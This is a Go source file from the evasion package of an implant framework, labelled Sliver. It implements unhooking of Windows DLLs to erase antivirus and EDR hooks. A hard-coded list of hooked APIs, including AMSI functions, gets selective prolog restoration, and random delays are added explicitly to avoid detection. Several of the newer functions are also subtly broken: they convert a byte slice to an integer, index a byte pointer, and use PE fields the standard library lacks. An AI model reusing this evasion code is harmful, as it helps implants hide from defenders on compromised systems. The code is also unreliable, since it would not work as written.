package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"math/rand"
	"time"

	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"debug/pe"
	"unsafe"
)

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf, e := x.Data()
	if e != nil {
		return e
	}
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	// vsize should always smaller than len(b)
	for i := 0; i < int(vsize); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// RefreshPESelective selectively restores function prologs instead of overwriting entire .text section
// This is a more stealthy approach that avoids detection from massive memory modifications
func RefreshPESelective(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Selective refreshing %s...\n", name)
	//{{end}}
	f, e := pe.Open(name)
	if e != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] Failed to open PE: %v\n", e)
		//{{end}}
		return e
	}
	defer f.Close()

	x := f.Section(".text")
	ddf, e := x.Data()
	if e != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] Failed to get .text data: %v\n", e)
		//{{end}}
		return e
	}

	// Get exports to identify critical functions to restore
	exports := f.Exports
	if exports == nil {
		//{{if .Config.Debug}}
		log.Printf("[!] No exports found in %s\n", name)
		//{{end}}
		return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
	}

	// Selectively restore only critical function prologs (first 10-20 bytes)
	// This is much less detectable than overwriting entire .text section
	restoredCount := 0
	maxRestoreBytes := 16 // Restore first 16 bytes of each function (typical prolog size)

	for _, exp := range exports {
		// Skip non-critical exports
		if !isCriticalFunction(exp.Name) {
			continue
		}

		// Calculate function address
		funcAddr := uint(ddf) + exp.FuncOffset

		// Get number of bytes to restore (limit to section bounds)
		bytesToRestore := uint32(maxRestoreBytes)
		if exp.FuncOffset+uint64(bytesToRestore) > x.VirtualSize {
			bytesToRestore = uint32(x.VirtualSize) - uint32(exp.FuncOffset)
		}

		if bytesToRestore == 0 {
			continue
		}

		// Restore only the prolog
		e := restoreFunctionProlog(name, ddf, x.VirtualAddress, x.VirtualSize, funcAddr, bytesToRestore, exp.Name)
		if e != nil {
			//{{if .Config.Debug}}
			log.Printf("[!] Failed to restore prolog for %s: %v\n", exp.Name, e)
			//{{end}}
			// Continue with other functions even if one fails
			continue
		}

		restoredCount++
	}

	//{{if .Config.Debug}}
	log.Printf("[*] Restored prologs for %d critical functions in %s\n", restoredCount, name)
	//{{end}}

	// If no critical functions were found, fall back to full refresh
	if restoredCount == 0 {
		//{{if .Config.Debug}}
		log.Printf("[!] No critical functions found, falling back to full refresh\n")
		//{{end}}
		return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
	}

	return nil
}

// isCriticalFunction determines if an export is a security-critical function
// that EDRs typically hook
func isCriticalFunction(funcName string) bool {
	criticalFunctions := map[string]bool{
		// ntdll.dll critical functions
		"NtAllocateVirtualMemory":  true,
		"NtWriteVirtualMemory":    true,
		"NtCreateThreadEx":       true,
		"NtProtectVirtualMemory":  true,
		"NtFreeVirtualMemory":     true,
		"NtCreateProcess":         true,
		"LdrLoadDll":            true,
		"LdrGetProcedureAddress":  true,

		// kernel32.dll critical functions
		"VirtualAlloc":           true,
		"VirtualAllocEx":         true,
		"VirtualFree":            true,
		"WriteProcessMemory":      true,
		"ReadProcessMemory":       true,
		"CreateRemoteThread":     true,
		"CreateThread":          true,
		"VirtualProtect":         true,
		"VirtualProtectEx":       true,
		"OpenProcess":           true,
		"CreateProcess":         true,
		"LoadLibrary":           true,
		"LoadLibraryEx":         true,
		"GetProcAddress":        true,

		// user32.dll critical functions
		"CreateWindow":          true,
		"ShowWindow":            true,
		"SetWindowsHookEx":      true,

		// amsi.dll
		"AmsiScanBuffer":       true,
		"AmsiInitialize":       true,
		"AmsiScanString":       true,
		"AmsiUninitialize":     true,

		// advapi32.dll
		"RegOpenKeyEx":         true,
		"RegSetValueEx":        true,
		"RegCreateKeyEx":       true,
	}

	return criticalFunctions[funcName]
}

// restoreFunctionProlog restores only the prolog bytes of a specific function
// This is much stealthier than overwriting the entire .text section
func restoreFunctionProlog(dllPath string, sectionData []byte, sectionVA, sectionSize uint32, funcAddr uint64, size uint32, funcName string) error {
	//{{if .Config.Debug}}
	log.Printf("[-] Restoring prolog for %s at 0x%x (%d bytes)\n", funcName, funcAddr, size)
	//{{end}}

	var oldProtect uint32
	addr := uintptr(funcAddr)

	// Make memory writable
	e := windows.VirtualProtect(addr, uintptr(size), windows.PAGE_READWRITE, &oldProtect)
	if e != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] VirtualProtect failed for %s: %v\n", funcName, e)
		//{{end}}
		return e
	}

	// Calculate offset in section data
	offset := funcAddr - sectionVA

	// Restore original bytes from section
	for i := uint32(0); i < size; i++ {
		if offset+uint64(i) >= uint64(len(sectionData)) {
			break
		}

		loc := addr + uintptr(i)
		mem := (*byte)(unsafe.Pointer(loc))
		(*mem)[0] = sectionData[offset+uint64(i)]
	}

	// Restore original protection
	e = windows.VirtualProtect(addr, uintptr(size), oldProtect, &oldProtect)
	if e != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] VirtualProtect (restore) failed for %s: %v\n", funcName, e)
		//{{end}}
		return e
	}

	//{{if .Config.Debug}}
	log.Printf("[+] Successfully restored prolog for %s\n", funcName)
	//{{end}}

	return nil
}

// RefreshPEWithDelay performs selective refresh with random delays to avoid detection
// Adding delays makes the pattern less predictable to EDRs
func RefreshPEWithDelay(name string) error {
	// Add random delay before refresh to avoid detection patterns
	randomDelay := time.Duration(rand.Intn(500)) * time.Millisecond
	time.Sleep(randomDelay)

	err := RefreshPESelective(name)

	// Add random delay after refresh
	randomDelay = time.Duration(rand.Intn(500)) * time.Millisecond
	time.Sleep(randomDelay)

	return err
}

